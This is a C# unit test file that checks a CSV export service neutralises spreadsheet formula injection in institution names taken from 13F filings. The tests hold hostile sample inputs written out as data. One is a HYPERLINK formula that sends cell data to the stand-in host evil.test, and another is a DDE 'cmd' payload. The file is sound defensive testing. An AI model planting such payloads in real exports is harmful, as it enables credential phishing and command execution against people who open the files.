using Equibles.Web.Services;

namespace Equibles.UnitTests.Web;

// Contract: a CSV cell must never execute as a spreadsheet formula. RFC-4180 quoting alone does
// not stop this — Excel and Sheets evaluate a cell whose text begins with =, +, -, @ (or a tab /
// CR) no matter how it was quoted. The exported text is not ours: institution names come straight
// off 13F filings, and anyone can file one, so a crafted name is a delivery vector for
// =HYPERLINK(...) credential phishing or a DDE payload against whoever opens the export.
public class CsvExportServiceFormulaInjectionTests
{
    [Theory]
    [InlineData("=1+1")]
    [InlineData("+1")]
    [InlineData("-1")]
    [InlineData("@SUM(A1)")]
    [InlineData("\tcmd")]
    [InlineData("\rcmd")]
    public void FormatText_NeutralisesEveryFormulaLeadIn(string value)
    {
        CsvExportService.FormatText(value).Should().Be("'" + value);
    }

    [Fact]
    public void FormatText_NeutralisesARealisticHyperlinkPayload()
    {
        // The shape an attacker would actually file as an institution name.
        const string payload = "=HYPERLINK(\"http://evil.test/?d=\"&A1,\"Click\")";

        CsvExportService.FormatText(payload).Should().StartWith("'=HYPERLINK");
    }

    [Theory]
    [InlineData("Berkshire Hathaway Inc")]
    [InlineData("AAPL")]
    [InlineData("3M Co")]
    public void FormatText_LeavesOrdinaryTextUntouched(string value)
    {
        CsvExportService.FormatText(value).Should().Be(value);
    }

    [Fact]
    public void FormatText_TreatsNullAndEmptyAsAnEmptyCell()
    {
        CsvExportService.FormatText(null).Should().BeEmpty();
        CsvExportService.FormatText(string.Empty).Should().BeEmpty();
    }

    [Fact]
    public void FormatText_OnlyGuardsTheLeadingCharacter()
    {
        // A formula character mid-value is inert, so quoting it would corrupt legitimate names.
        CsvExportService.FormatText("Smith & Wesson =").Should().Be("Smith & Wesson =");
    }

    [Fact]
    public void TheGuardSurvivesRfc4180Quoting()
    {
        // The two rules compose: FormatText prefixes, EscapeField then quotes for the comma. The
        // apostrophe must still be the first character inside the quotes.
        var cell = CsvExportService.EscapeField(CsvExportService.FormatText("=cmd|'/c calc'!A1, Inc"));

        cell.Should().StartWith("\"'=cmd");
    }

    [Fact]
    public void BuildCsv_EmitsTheGuardedCellIntoTheDocument()
    {
        var csv = CsvExportService.BuildCsv(
            ["Holder"],
            [new[] { CsvExportService.FormatText("=1+1") }]
        );

        csv.Should().Be("Holder\n'=1+1\n");
    }
}
